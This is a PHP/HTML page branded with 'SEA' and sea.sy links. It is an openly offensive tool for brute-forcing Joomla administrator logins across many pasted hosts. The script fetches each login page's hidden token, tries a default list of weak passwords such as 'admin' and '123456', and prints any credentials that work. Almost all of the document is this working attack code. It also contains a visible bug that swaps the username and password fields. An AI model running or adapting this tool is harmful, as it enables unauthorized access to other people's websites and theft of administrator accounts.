<html>
<head>
<title>SEA | Joomla Brute Force Attack .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>
<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
echo CSS($sh3llColor)
?>
</head>
<!-- Joomla Brute Force Attack -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400" style="height:200px;">	
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' id='Box'>
    <tr>
<td width='4%' style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
<td width="96%" colspan="3" >Joomla Brute Force Attack </td>
</tr>
    <tr>
      <td style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
      <td >Hosts : </td>
      <td > Users : </td>
      <td >Passwords : </td>
    </tr>
    <tr>
      <td style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
      <td ><textarea name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
      <td ><textarea name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input type="submit" name="submit" value="Brute Now"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['usernames']));
	$usernames = trim(filter($_POST['passwords'])); 

	if($passwords && $usernames && $hosts)
	{	
		$hosts_explode = explode("\n", $hosts);
    	$password_explode = explode("\n", $passwords);
    	$username_explode = explode("\n", $usernames);

		foreach($hosts_explode as $host)
		{
			if(file_exists('joomla-cookie.txt'))
			{unlink('joomla-cookie.txt');}	
			$hacked = 0;				
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			
			if(!url_exists($host."/administrator/index.php"))
			{echo "<br><font color='#990000'>".$host." => <font color='red'>Error In Login Page !</font></font>";ob_flush();flush();continue;}
			
			foreach($username_explode as $username) 
			{		
				foreach($password_explode as $password) 
				{	
					preg_match_all("/<input type=\"hidden\" name=\"(.+)\" value=\"(.+)\" \/>/", Connect($host.'/administrator/index.php'), $sid);
					$password = str_replace(array("\n", "\r"), "", trim($password));
					$username = str_replace(array("\n", "\r"), "", trim($username));

					if(preg_match("/adminlist/", Connect("http://".$host.'/administrator/index.php', 1, "username=".$username."&passwd=".$password."&".$sid[1][2]."=1&option=com_login&task=login")))
					{					
						$hacked = 1;
						echo "<br>
<font color='#990000'>http://".$host." => UserName : [<font color='green'>".$username."</font>] : Password : [<font color='green'>".$password."</font>]</font>";
						ob_flush();flush();
					} 
					if($hacked == 1){break;}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<br><font color='#990000'>http://".$host." => <font color='red'>Failed !</font></font>";ob_flush();flush();}
		}
		if(file_exists('joomla-cookie.txt'))
		{unlink('joomla-cookie.txt');}
	} 
	else {echo "<font color='red'>All fields are Required ! </font>";}
}
?>
</td></tr>
</table></form>

<!-- End Of Joomla Brute Force Attack -->
</center>
<?php
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}
function url_exists($strURL) 
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
} 
function Connect($url, $post = 0, $postfields = '') 
{	
    $ch = curl_init();
    if($post > 0) 
	{
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
    }
	curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__).'/joomla-cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__).'/joomla-cookie.txt');
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $exec = curl_exec($ch);
    if($exec) { return $exec; } else { return 0; }
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0)
	{
		return stripslashes($string);	
	}
	else
	{
		return $string;	
	}
}
function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}

footer();
?> 

